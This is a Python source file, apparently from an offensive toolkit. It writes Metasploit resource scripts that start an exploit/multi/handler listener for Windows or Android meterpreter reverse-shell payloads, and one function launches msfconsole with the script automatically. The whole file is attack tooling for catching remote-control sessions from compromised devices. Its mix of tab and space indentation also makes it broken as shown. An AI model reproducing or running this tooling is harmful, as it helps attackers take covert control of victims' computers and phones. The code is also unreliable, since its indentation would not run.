import os,time

def make(o,p,po,n):
        a = open("back/ip.txt","r")
        IP = a.readline()
        start = "use exploit/multi/handler\n"
        next = "set LHOST "+str(IP)
        next3 = "set LPORT "+po
	another = "\n"
        if o == "windows":
            next1 = "set PAYLOAD windows/meterpreter/reverse_"+p+"\n"
            last = "exploit -j\n"
            create= open("msfScripts/"+n+"Script.rc","w")
            create.close()
            script = open("msfScripts/"+n+"Script.rc","a")
            script.write(start)
	    script.write(next1)
            script.write(next)
            script.write(another)
	    script.write(next3)
	    script.write(another)
            script.write(last)
            script.close()
	    print("")
            print("Script has been created in ../msfScripts with the name "+n+"Script.rc\n")
            time.sleep(2)
            print("===========================Starting script...==========================\n")
            time.sleep(1.5)
            os.system("msfconsole -r msfScripts/"+n+"Script.rc")
        else:
            next1 = "set PAYLOAD android/meterpreter/reverse_"+p+"\n"
            last = "exploit -j\n"
            create= open("msfScripts/"+n+"Script.rc","w")
            create.close()
            script = open("msfScripts/"+n+"Script.rc","a")
            script.write(start)
	    script.write(next1)
            script.write(next)
            script.write(another)
	    script.write(next3)
	    script.write(another)
            script.write(last)
            script.close()
	    print("")
            print("Script has been created in ../msfScripts with the name "+n+"Script.rc\n")
            time.sleep(2)
            print("===========================Starting script...==========================\n")
            time.sleep(1.5)
            os.system("msfconsole -r msfScripts/"+n+"Script.rc")
def nMake(o,p,po,n):
        a = open("back/ip.txt","r")
        IP = a.readline()
        start = "use exploit/multi/handler\n"
        next = "set LHOST "+str(IP)
        next3 = "set LPORT "+po
	another = "\n"
        if o == "windows":
            next1 = "set PAYLOAD windows/meterpreter/reverse_"+p+"\n"
            last = "exploit -j\n"
            create= open("msfScripts/"+n+"Script.rc","w")
            create.close()
            script = open("msfScripts/"+n+"Script.rc","a")
            script.write(start)
	    script.write(next1)
            script.write(next)
            script.write(another)
	    script.write(next3)
	    script.write(another)
            script.write(last)
            script.close()
	    print("")
            print("Script has been created in ../msfScripts with the name "+n+"Script.rc\n")
            time.sleep(2)
        else:
            next1 = "set PAYLOAD android/meterpreter/reverse_"+p+"\n"
            last = "exploit -j\n"
            create= open("msfScripts/"+n+"Script.rc","w")
            create.close()
            script = open("msfScripts/"+n+"Script.rc","a")
            script.write(start)
	    script.write(next1)
            script.write(next)
            script.write(another)
	    script.write(next3)
	    script.write(another)
            script.write(last)
            script.close()
	    print("")
            print("Script has been created in ../msfScripts with the name "+n+"Script.rc\n")
            time.sleep(2)

